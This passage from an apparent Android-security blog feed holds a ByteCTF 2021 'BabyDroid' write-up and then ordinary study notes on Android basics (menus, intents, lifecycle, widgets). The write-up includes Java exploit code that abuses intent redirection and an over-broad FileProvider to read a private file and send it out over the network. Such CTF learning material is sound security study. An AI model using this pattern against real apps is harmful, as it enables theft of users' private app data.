href="https://blog.wjhwjhn.com/posts/bytectf-2021-android-writeup/">https://blog.wjhwjhn.com/posts/bytectf-2021-android-writeup/</a></p><p><a href="https://blog.wm-team.cn/index.php/archives/7/#%3Cstrong%3EHardDroid%3C%2Fstrong%3E">https://blog.wm-team.cn/index.php/archives/7/#%3Cstrong%3EHardDroid%3C%2Fstrong%3E</a></p><h2 id="BabyDroid"><a href="#BabyDroid" class="headerlink" title="BabyDroid"></a>BabyDroid</h2><h3 id="考点："><a href="#考点：" class="headerlink" title="考点："></a><strong>考点</strong>：</h3><ul><li>Intent重定向</li><li>Grant Uri Permission 通过fileprovider任意读写</li></ul><p>对于<code>题目部署和运行环境</code>没有太过研究，主要是对漏洞加深理解，学习一下思路</p><h3 id="apk分析"><a href="#apk分析" class="headerlink" title="apk分析"></a>apk分析</h3><p><strong>Manifest.xml</strong></p><p>对于这道题看一下Vulnerable.apk的清单文件</p><p><img src="2025-01-15-App安全分析指南/image-20241009194758416.png" alt="image-20241009194758416"></p><p>主要是上面红框内容：2个Activity，一个Receiver，一个provider。</p><p><strong>MainActivity</strong></p><p>主要就是加载布局</p><p><strong>Vulnerable</strong></p><p><img src="2025-01-15-App安全分析指南/image-20241009195133582.png" alt="image-20241009195133582"></p><p>获取反序列化 <code>key</code>值为<code>intent</code>的数据，然后启动Intent</p><p><strong>FlagReceiver</strong></p><p><img src="2025-01-15-App安全分析指南/image-20241009195413623.png" alt="image-20241009195413623"></p><p>创建一个 /data/data/Package_name/files/flag文件，并且把key值为flag获取的数据存放在创建的路径文件下，这里应该就是flag关键。</p><p><strong>Provider</strong></p><p><code>FileProvider</code>是<code>ContentProvider</code>的一个子类，使用content://代替file://，使得共享数据安全。</p><p>content URI允许临时授予该文件读写权限，只需要当创建一个包含该文件的content URI的时候，可以通过<code>Intent.setFlags()</code>添加相应的权限。</p><p>当创建FileProvider的时候，需要一个xml文件指定该provider提供的文件，如<code>res/xml/file_paths.xml</code>，其中提供了相应的映射路径和别名，</p><p>同时需要在AndroidManifest.xml中的FileProvider对应的节点内定义<code>&lt;meta-data android:name=&quot;android.support.FILE_PROVIDER_PATHS&quot; android:resource=&quot;@xml/file_paths&quot; &gt;</code>来声明。（其中resource属性内为提供的xml文件）</p><p>该Vulnerable.apk指定的xml文件内容如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">paths</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">root-path</span> <span class="attr">name</span>=<span class="string">&quot;root&quot;</span> <span class="attr">path</span>=<span class="string">&quot;&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">paths</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>&lt;root-path&gt;</code>节点：代表设备的根目录</p><ul><li><p><code>name</code>属性：给该目录起的别名，用于隐藏路径</p></li><li><p><code>path</code>属性：临时授权访问的路径（该目录下的子目录）</p></li></ul><p>则该APK提供的FileProvider提供了根目录，通过<code>root/</code>别名来访问</p><p>则如果我们想访问flag的存储路径，实际构造的部分uri应为<code>root/data/data/[package_name]/files/flag</code>。</p><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>主要就是通过<code>FileProvider</code>获得这个<code>files/flag</code>文件的内容，但是他是不可导出的，发现他有一个<code>grantUriPermissions=&quot;true&quot;</code>所以可以利用这个访问content uri内容。</p><p>在Attack.apk中构造Intent访问content uri内容，然后利用Vnlnerable.class启动这个intent</p><p>其中构造的URL：</p><p><code>content://androidx.core.content.FileProvider/root/data/data/com.bytectf.babydroid/files/flag</code></p><h3 id="Attack实现"><a href="#Attack实现" class="headerlink" title="Attack实现"></a>Attack实现</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">getFlag</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 判断一下是否是被目标apk来start的该Activity</span></span><br><span class="line">    <span class="keyword">if</span> (getIntent().getAction().equals(<span class="string">&quot;evil&quot;</span>)) &#123;</span><br><span class="line">        <span class="comment">// 获取接收到的uri</span></span><br><span class="line">        <span class="type">Uri</span> <span class="variable">data</span> <span class="operator">=</span> getIntent().getData();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 定义一个字符输入流</span></span><br><span class="line">            <span class="type">InputStreamReader</span> <span class="variable">isr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(getContentResolver().openInputStream(data));</span><br><span class="line">            <span class="type">char</span>[] buf = <span class="keyword">new</span> <span class="title class_">char</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="type">StringBuffer</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">            <span class="keyword">while</span> (-<span class="number">1</span> != isr.read(buf, <span class="number">0</span>, <span class="number">1024</span>)) &#123;</span><br><span class="line">                sb.append(String.valueOf(buf));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 读取的内容输入存储到flag</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(sb);</span><br><span class="line">            Log.d(<span class="string">&quot;PwnPwn&quot;</span>, flag);</span><br><span class="line">            ((TextView) findViewById(R.id.tv_show)).setText(<span class="keyword">new</span> <span class="title class_">String</span>(sb));</span><br><span class="line">            <span class="comment">// 通过网络、将信息传输回来获取</span></span><br><span class="line">            sendData(<span class="string">&quot;getFlag&quot;</span>,flag);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 定义一个action为&quot;evil&quot;的Intent</span></span><br><span class="line">        <span class="type">Intent</span> <span class="variable">evil</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(<span class="string">&quot;evil&quot;</span>);</span><br><span class="line">        <span class="comment">// 设定目的组件为当前MainActivity，也可以单独放在另一个AttackActivity中</span></span><br><span class="line">        evil.setClassName(getPackageName(), MainActivity.class.getName());</span><br><span class="line">        <span class="comment">// 设置操纵data数据为 flag所在文件的contentURI</span></span><br><span class="line">        evil.setData(Uri.parse(pwnUri));</span><br><span class="line">        <span class="comment">// 添加读写权限</span></span><br><span class="line">        evil.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 新建一个intent，用于启动目标APK</span></span><br><span class="line">        <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">        <span class="comment">// 启动的目标Activity为Vulnerable</span></span><br><span class="line">        intent.setClassName(<span class="string">&quot;com.bytectf.babydroid&quot;</span>, <span class="string">&quot;com.bytectf.babydroid.Vulnerable&quot;</span>);</span><br><span class="line">        <span class="comment">// 同时将构造好的evil Intent当作 key &quot;intent&quot;的数据包装进去</span></span><br><span class="line">        intent.putExtra(<span class="string">&quot;intent&quot;</span>, evil);</span><br><span class="line">        <span class="comment">// 启动目标apk</span></span><br><span class="line">        startActivity(intent);</span><br><span class="line">        finish();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 移动安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android安全 </tag>
            
            <tag> 安全测试 </tag>
            
            <tag> 漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《第一行代码》阅读笔记</title>
      <link href="/posts/69766bbb.html"/>
      <url>/posts/69766bbb.html</url>
      
        <content type="html"><![CDATA[<h1 id="《第一行代码》"><a href="#《第一行代码》" class="headerlink" title="《第一行代码》"></a>《第一行代码》</h1><h2 id="Activity"><a href="#Activity" class="headerlink" title="Activity"></a>Activity</h2><h3 id="在活动中使用Menu"><a href="#在活动中使用Menu" class="headerlink" title="在活动中使用Menu"></a>在活动中使用Menu</h3><p>在res目录下新建一个menu文件夹，文件夹下新建一个名叫main的菜单文件，右键menu文件夹—&gt;New—&gt;Menu resource file,文件名为main。然后在main.xml中添加如下代码：</p><p><img src="2025-01-15-《第一行代码》阅读笔记/image-20240717145842714.png" alt="image-20240717145842714"></p><p>创建两个菜单项，<item>标签用来创建一个具体的菜单项，android:id给菜单项指定一个唯一的标识符，android:title给菜单项指定一个名称，接着重写onCreateOptionsMenu()方法<br><img src="2025-01-15-《第一行代码》阅读笔记/image-20240717150644340.png" alt="image-20240717150644340"></p><p>通过getMenuInflater()方法得到MenuInflater对象，再调用inflate()方法就可以给当前活动创建菜单了，inflate()有两个参数，第一个参数用于指定我们通过哪一个资源文件来创建菜单，这里传入R.menu.main，第二个参数指定我们菜单项将添加到哪一个Menu对象当中，这里直接传入参数menu，返回true允许菜单显示，相反则false。</p><p>当然我们可以重写onOptionsItemSelected()实现菜单点击响应事件。</p><p><img src="2025-01-15-《第一行代码》阅读笔记/image-20240717151418765.png" alt="image-20240717151418765"></p><p>通过item.getItemId()判断点击的是哪一个菜单项</p><h3 id="Intent在活动使用"><a href="#Intent在活动使用" class="headerlink" title="Intent在活动使用"></a>Intent在活动使用</h3><h4 id="显示启动Activity"><a href="#显示启动Activity" class="headerlink" title="显示启动Activity"></a><strong>显示启动Activity</strong></h4><p><img src="2025-01-15-《第一行代码》阅读笔记/image-20240717152652636.png" alt="image-20240717152652636"></p><h4 id="隐式启动Activity"><a href="#隐式启动Activity" class="headerlink" title="隐式启动Activity"></a><strong>隐式启动Activity</strong></h4><p><img src="2025-01-15-《第一行代码》阅读笔记/image-20240717153253483.png" alt="image-20240717153253483"></p><p>配置如下：</p><p><img src="2025-01-15-《第一行代码》阅读笔记/image-20240717153309587.png" alt="image-20240717153309587"></p><p>其中category的这个为默认的category，使用startActivity会自动将这个category添到intent</p><p><strong>添加一个category</strong></p><p><img src="2025-01-15-《第一行代码》阅读笔记/image-20240717153932110.png" alt="image-20240717153932110"></p><p>配置如下</p><p><img src="2025-01-15-《第一行代码》阅读笔记/image-20240717153943644.png" alt="image-20240717153943644"></p><h4 id="intent启动其他程序的活动"><a href="#intent启动其他程序的活动" class="headerlink" title="intent启动其他程序的活动"></a>intent启动其他程序的活动</h4><p>调用系统的浏览器打开网页</p><p><img src="2025-01-15-《第一行代码》阅读笔记/image-20240717154420350.png" alt="image-20240717154420350"></p><p>Intent的action为Intent.ACTION_VIEW，这是系统内置的动作，其常量值为<code>android.intent.action.VIEW</code></p><p>Uri.parse：网址字符串解析为一个Uri对象，再调用setData()将这个Uri对象传递进去。</p><p>setDate()：接收一个Uri对象，主要用于指定当前Intent正在操作的数据，数据通常已字符串形式传入到Uri.parse</p><p>我们还可以在<code>&lt;intent-filter&gt;</code>中配置<code>&lt;data&gt;</code>标签，更精确指定当前活动响应什么类型的数据。<code>&lt;data&gt;</code>标签配置以下内容</p><ul><li>android:scheme：用于指定数据的协议部分，如http</li><li>android:host：指定数据的主机名部分，如www.baidu.com</li><li>android:port：指定数据端口部分，一般紧跟主机名后</li><li>android:path：用于指定主机名和端口之后的部分，如一段网址中跟在域名之后的内容</li><li>android:mimeType：用于指定可以处理的数据类型，允许使用通配符方式进行指定</li></ul><p>只有<code>data</code>标签中指定内容和Intent中携带的Data完全一致时，当前活动才能响应Intent，android:scheme为http，则响应所有http协议的Intent</p><p><img src="2025-01-15-《第一行代码》阅读笔记/image-20240717161643442.png" alt="image-20240717161643442"></p><p>此时这个activity就可以响应一个打开网页的Intent了吗，(这里报错，应该和版本啥的有关系，没细究)</p><p><strong>调用系统拨号界面</strong></p><p><img src="2025-01-15-《第一行代码》阅读笔记/image-20240717161947683.png" alt="image-20240717161947683"></p><h4 id="向下一个活动传递数据"><a href="#向下一个活动传递数据" class="headerlink" title="向下一个活动传递数据"></a><strong>向下一个活动传递数据</strong></h4><p>传递数据</p><p><img src="2025-01-15-《第一行代码》阅读笔记/image-20240717173838919.png" alt="image-20240717173838919"></p><p>下一个活动接收数据</p><p><img src="2025-01-15-《第一行代码》阅读笔记/image-20240717173908890.png" alt="image-20240717173908890"></p><h4 id="返回数据给上一个活动"><a href="#返回数据给上一个活动" class="headerlink" title="返回数据给上一个活动"></a>返回数据给上一个活动</h4><p>接收数据</p><p><img src="2025-01-15-《第一行代码》阅读笔记/image-20240717175001474.png" alt="image-20240717175001474"></p><p>传递数据</p><p><img src="2025-01-15-《第一行代码》阅读笔记/image-20240717175020237.png" alt="image-20240717175020237"></p><ul><li><p>startActivityForResult()：启动一个活动，当活动销毁时返回一个结果给上一个活动，销毁后回调上一个方法的onActivityResult()方法</p></li><li><p>SecondActivity的Intent专门用来传递数据用的，没指定意图</p></li><li><p>setResult()：向上一个活动返回数据</p></li><li><p>onActivityResult(t requestCode, int resultCode, @Nullable Intent data)：<br>requestCode 启动活动时传入的请求码<br>resultCode 返回数据传入的处理结果<br>data 携带返回数据的intent</p></li></ul><p>当<strong>触摸返回键</strong>，数据返回上一个活动</p><p><img src="2025-01-15-《第一行代码》阅读笔记/image-20240717180224720.png" alt="image-20240717180224720"></p><h3 id="活动的生命周期"><a href="#活动的生命周期" class="headerlink" title="活动的生命周期"></a>活动的生命周期</h3><h4 id="活动状态"><a href="#活动状态" class="headerlink" title="活动状态"></a>活动状态</h4><ol><li>运行状态：活动位于返回栈的栈顶时</li><li>暂停状态：活动不再处于栈顶位置，但仍可见，只有内存极低情况下，系统考虑回收这种活动</li><li>停止状态：活动不再处于栈顶位置，完全不可见。当其他位置需要内存时，处于这个状态的活动可能被系统回收</li><li>销毁状态：返回栈中移除。</li></ol><h4 id="活动生存期"><a href="#活动生存期" class="headerlink" title="活动生存期"></a>活动生存期</h4><p>onCreate ()：活动第一次被创建时候调用，完成初始化</p><p>onStart()：活动由不可见变为可见的时候调用</p><p>onResume()：活动准备好和用户交互时候调用，此时活动位于栈顶，处于运行状态</p><p>onPause()：系统准备启动或者恢复另一个活动时调用</p><p>onStop()：活动完全不可见调用</p><p>onDestory()：活动被销毁前调用</p><p>onRestart()：活动由停止状态变为运行状态之前调用</p><p><strong>完整生存期</strong>：onCreate和onDestory之前经历的<br><strong>可见生存期</strong>：onStart()和onStop()之间经历的</p><p><strong>前台生存期</strong>：onResume和onPause之前经历的</p><p><code>android:theme=&quot;@android:style/Theme.Dialog&quot;</code>活动以对话框主题方式显示</p><h4 id="活动被回收时"><a href="#活动被回收时" class="headerlink" title="活动被回收时"></a>活动被回收时</h4><p><strong>保存数据</strong></p><p>onSaveInstanceState()回调，这个方法保证活动被回收之前一定会被调用，用来保存被回收活动的数据</p><p>Bundle类型参数提供保存数据方法，如putString()保存字符串</p><p>每个保存方法两个参数，第一个键值，第二个要保存的内容。</p><p><strong>恢复数据</strong></p><p>onCreate()方法也有一个Bundle类型参数，一般为null，当通过onSaveInstanceState()保存数据时，onCreate的Bundle参数就会带有之前保存的全部数据。</p><p><img src="2025-01-15-《第一行代码》阅读笔记/image-20240718160852741.png" alt="image-20240718160852741"></p><p><img src="2025-01-15-《第一行代码》阅读笔记/image-20240718161106609.png" alt="image-20240718161106609"></p><h4 id="活动启动模式"><a href="#活动启动模式" class="headerlink" title="活动启动模式"></a>活动启动模式</h4><p>standard，singleTop，singleTask，singleInstance</p><p>standard：默认启动模式</p><p>singleTop：当活动位于栈顶时，不再创建新的示例</p><p>singleTask：每次启动活动系统首先在返回栈中检查该活动是否存在实例，如果有则直接使用，并把在这个活动之上所有活动统统出栈。</p><p>singleInstance：单独一个返回栈管理这个指定活动</p><p><code>getTaskId()</code>：获得返回栈ID</p><h3 id="活动最佳实践"><a href="#活动最佳实践" class="headerlink" title="活动最佳实践"></a>活动最佳实践</h3><h4 id="知晓当前是哪一个活动"><a href="#知晓当前是哪一个活动" class="headerlink" title="知晓当前是哪一个活动"></a>知晓当前是哪一个活动</h4><p>新建一个Java.class—》BaseActivity，继承AppCompatActivity，重写onCreate如下</p><p>getClass().getSimpleName（）获得当前类名</p><p><img src="2025-01-15-《第一行代码》阅读笔记/image-20240718162008861.png" alt="image-20240718162008861"></p><p>在让BaseActivity成为活动的父类，如下</p><p><img src="2025-01-15-《第一行代码》阅读笔记/image-20240718162144676.png" alt="image-20240718162144676"></p><h4 id="随时随地退出程序"><a href="#随时随地退出程序" class="headerlink" title="随时随地退出程序"></a>随时随地退出程序</h4><p>使用一个专门的集合类对所有活动进行管理就可以了</p><p><img src="2025-01-15-《第一行代码》阅读笔记/image-20240718164747821.png" alt="image-20240718164747821"></p><p>BaseActivity进行向List添加或者删除活动，因为活动继承BaseActivtiy，所以每个活动都会调用这个onCreate</p><p><img src="2025-01-15-《第一行代码》阅读笔记/image-20240718165844056.png" alt="image-20240718165844056"></p><p><code>android.os.Process.killProcess(android.os.Process.myPid())</code>用于kill当前进程</p><h2 id="UI控件"><a href="#UI控件" class="headerlink" title="UI控件"></a>UI控件</h2><h3 id="控件使用方法"><a href="#控件使用方法" class="headerlink" title="控件使用方法"></a>控件使用方法</h3><h4 id="TextView"><a href="#TextView" class="headerlink" title="TextView"></a>TextView</h4><p>TextView文字默认在左上方</p><p><strong>指定文字对齐方式</strong></p><p><img src="2025-01-15-《第一行代码》阅读笔记/image-20240718181813169.png" alt="image-20240718181813169"></p><p>修改颜色大小</p><p><img src="2025-01-15-《第一行代码》阅读笔记/image-20240718181955059.png" alt="image-20240718181955059"></p><h4 id="Button"><a href="#Button" class="headerlink" title="Button"></a>Button</h4><p>button默认字母大写，如下命令可以修改 <code>android:textAllCaps=&quot;false&quot;</code></p><h4 id="EditText"><a href="#EditText" class="headerlink" title="EditText"></a>EditText</h4><p><img src="2025-01-15-《第一行代码》阅读笔记/image-20240718183150170.png" alt="image-20240718183150170"></p><p><code>android:maxLines=&quot;2&quot;</code>指定最大行数为2行</p><p>获取编辑框的内容 <code>String input=editText.getText().toString();</code></p><h4 id="ImageView"><a href="#ImageView" class="headerlink" title="ImageView"></a>ImageView</h4><p>指定照片  <code>android:src=&quot;@drawable/ic_launcher_background&quot;</code></p><p>修改显示的图片</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Button button;</span><br><span class="line">    <span class="keyword">private</span> ImageView imageView;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        button = findViewById(R.id.button);</span><br><span class="line">        imageView=findViewById(R.id.image_view);</span><br><span class="line">        button.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View view)</span> &#123;</span><br><span class="line">                <span class="keyword">switch</span> (view.getId())&#123;</span><br><span class="line">                    <span class="keyword">case</span> R.id.button:</span><br><span class="line">                        imageView.setImageResource(R.drawable.img);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">default</span>:</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再点击按钮事件后，调用setImageResource()方法改变显示图片为R.drawable.img</p><h4 id="ProgressBar"><a href="#ProgressBar" class="headerlink" title="ProgressBar"></a>ProgressBar</h4><p>用于界面上显示一个进度条</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;ProgressBar</span><br><span class="line">        android:<span class="attribute">id</span>=<span class="string">&quot;@+id/process_bar&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_height</span>=<span class="string">&quot;wrap_content&quot;</span>/&gt;</span><br></pre></td></tr></table></figure><p><strong>Android控件的可见属性</strong></p><p>通过android:visibility指定，有三个选择：visible，invisible，gone</p><p>visible：控件可见</p><p>invisible：控件不可见，但仍占据原来位置</p><p>gone：控件不可见，且不占用屏幕空间</p><p>还可以通过代码控制可见性</p><p>使用setVisibility()，传入View.VISIBLE，View.INVISIBLE，View.GONE</p><p>实现点击按钮让进度条消失出现</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">       <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">       setContentView(R.layout.activity_main);</span><br><span class="line">       button = findViewById(R.id.button);</span><br><span class="line">       progressBar=findViewById(R.id.progress_bar);</span><br><span class="line">       button.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">           <span class="meta">@Override</span></span><br><span class="line">           <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View view)</span> &#123;</span><br><span class="line">               <span class="keyword">switch</span> (view.getId())&#123;</span><br><span class="line">                   <span class="keyword">case</span> R.id.button:</span><br><span class="line">                       <span class="keyword">if</span>(progressBar.getVisibility()==View.GONE)&#123;</span><br><span class="line">                           progressBar.setVisibility(View.VISIBLE);</span><br><span class="line">                       &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                           progressBar.setVisibility((View.GONE));</span><br><span class="line">                       &#125;</span><br><span class="line">                       <span class="keyword">break</span>;</span><br><span class="line">                   <span class="keyword">default</span>:</span><br><span class="line">                       <span class="keyword">break</span>;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;);</span><br><span class="line"></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>ProgressBar控件通过style属性可以将他指定为水平进度条</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">style=<span class="string">&quot;?android:attr/progressBarStyleHorizontal&quot;</span></span><br><span class="line">android:<span class="built_in">max</span>=<span class="string">&quot;100&quot;</span>  <span class="comment">//进度条最大值</span></span><br></pre></td></tr></table></figure><p>动态更改进度条进度</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View view)</span> &#123;</span><br><span class="line">    <span class="keyword">switch</span> (view.getId())&#123;</span><br><span class="line">          <span class="keyword">case</span> R.id.button:</span><br><span class="line">               <span class="type">int</span> <span class="variable">progress</span> <span class="operator">=</span> progressBar.getProgress();</span><br><span class="line">               progress=progress+<span class="number">10</span>;</span><br><span class="line">               progressBar.setProgress(progress);</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">default</span>:</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="AlterDialog"><a href="#AlterDialog" class="headerlink" title="AlterDialog"></a>AlterDialog</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View view)</span> &#123;</span><br><span class="line">     <span class="keyword">switch</span> (view.getId())&#123;</span><br><span class="line">          <span class="keyword">case</span> R.id.button:</span><br><span class="line">              AlertDialog.Builder dialog= <span class="keyword">new</span> <span class="title class_">AlertDialog</span>.Builder(MainActivity.<span class="built_in">this</span>);</span><br><span class="line">              dialog.setTitle(<span class="string">&quot;This is dialog&quot;</span>);</span><br><span class="line">              dialog.setMessage(<span class="string">&quot;Something Important&quot;</span>);</span><br><span class="line">              dialog.setCancelable(<span class="literal">false</span>); <span class="comment">//点击对话框外 不能取消对话框</span></span><br><span class="line">              dialog.setPositiveButton(<span class="string">&quot;OK&quot;</span>, <span class="keyword">new</span> <span class="title class_">DialogInterface</span>.OnClickListener() &#123;</span><br><span class="line">                            <span class="meta">@Override</span></span><br><span class="line">                     <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(DialogInterface dialog, <span class="type">int</span> i)</span> &#123;</span><br><span class="line"></span><br><span class="line">                     &#125;</span><br><span class="line">              &#125;);</span><br><span class="line">              dialog.setNegativeButton(<span class="string">&quot;Cancel&quot;</span>, <span class="keyword">new</span> <span class="title class_">DialogInterface</span>.OnClickListener()</span><br><span class="line">                            <span class="meta">@Override</span></span><br><span class="line">                     <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(DialogInterface dialog, <span class="type">int</span> i)</span> &#123;</span><br><span class="line"></span><br><span class="line">                     &#125;</span><br><span class="line">              &#125;);</span><br><span class="line">              dialog.show();</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">default</span>:</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="ProgressDialog"><a href="#ProgressDialog" class="headerlink" title="ProgressDialog"></a>ProgressDialog</h4><p>会在对话框中显示一个进度条，一般用于表示当前操作比较耗时，让用户耐心等待。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public void onClick(View view) &#123;</span><br><span class="line">     switch (view.getId())&#123;</span><br><span class="line">         case R.id.button:</span><br><span class="line">              ProgressDialog progressDialog=new ProgressDialog(MainActivity.this);</span><br><span class="line">              progressDialog.setTitle(&quot;This 